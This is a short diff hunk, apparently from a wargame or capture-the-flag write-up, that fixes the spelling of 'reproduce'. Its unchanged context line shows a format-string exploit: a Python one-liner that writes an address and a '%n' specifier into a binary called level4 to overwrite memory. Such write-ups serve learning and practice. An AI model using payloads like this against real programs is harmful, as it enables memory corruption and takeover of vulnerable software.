@@ -93,4 +93,4 @@ With the "%n" modifier
 
 	$ python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"' | ./level4
 
-Script it for reproduice!
+Script it for reproduce!
